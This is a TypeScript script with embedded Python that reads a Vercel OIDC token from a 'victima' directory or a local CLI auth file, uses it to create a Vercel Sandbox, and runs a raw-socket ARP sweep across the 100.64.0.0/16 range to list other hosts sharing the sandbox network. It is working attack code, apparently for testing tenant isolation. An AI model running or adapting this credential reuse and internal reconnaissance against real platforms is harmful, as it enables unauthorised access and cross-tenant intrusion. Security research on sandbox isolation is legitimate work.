import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
async function main() {
  const sbx = await Sandbox.create({
    name: "arp-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  console.log("NAME=" + (sbx as any).name);
  console.log("IP_LOCAL (probamos tras boot)");
  // dormir un poco para que arranque
  await new Promise((r) => setTimeout(r, 3000));
  const SCRIPT = `
set +e
ip -4 addr show eth0 2>/dev/null | grep inet
echo "=== ARP scan de la celda ==="
python3 - <<'PYEOF'
import socket, struct, fcntl, time
def mac():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    r = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', b'eth0'[:15]))
    return r[18:24]
def ip_local():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('100.64.0.1', 1))
    return s.getsockname()[0]
try:
    myip = ip_local()
except Exception as e:
    print('no ip yet', e); myip = None
if myip:
    mymac = mac()
    print('local ip=%s mac=%s' % (myip, mymac.hex()))
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind(('eth0', 0))
    def arp_req(dst_ip):
        eth = b'\xff'*6 + mymac + struct.pack('!H', 0x0806)
        arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, 1) + mymac + socket.inet_aton(myip) + b'\x00'*6 + socket.inet_aton(dst_ip)
        return eth + arp + b'\x00'*18
    sock.setblocking(False)
    found = {}
    total = 0
    for i in range(256):
        for j in range(1, 255):
            ip = '100.64.%d.%d' % (i, j)
            sock.send(arp_req(ip))
            total += 1
            if total % 4000 == 0:
                while True:
                    try:
                        pkt = sock.recv(4096)
                        if len(pkt) >= 42 and pkt[12:14] == b'\x08\x06':
                            sip = socket.inet_ntoa(pkt[28:32])
                            if sip not in found:
                                found[sip] = pkt[22:28].hex()
                                print('ARP-HOST %s %s' % (sip, found[sip]))
                    except BlockingIOError:
                        break
                time.sleep(0.001)
    time.sleep(2)
    while True:
        try:
            pkt = sock.recv(4096)
            if len(pkt) >= 42 and pkt[12:14] == b'\x08\x06':
                sip = socket.inet_ntoa(pkt[28:32])
                if sip not in found:
                    found[sip] = pkt[22:28].hex()
                    print('ARP-HOST %s %s' % (sip, found[sip]))
        except BlockingIOError:
            break
    print('ARP done sent=%d found=%d' % (total, len(found)))
PYEOF
echo "===== DONE ====="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 110_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });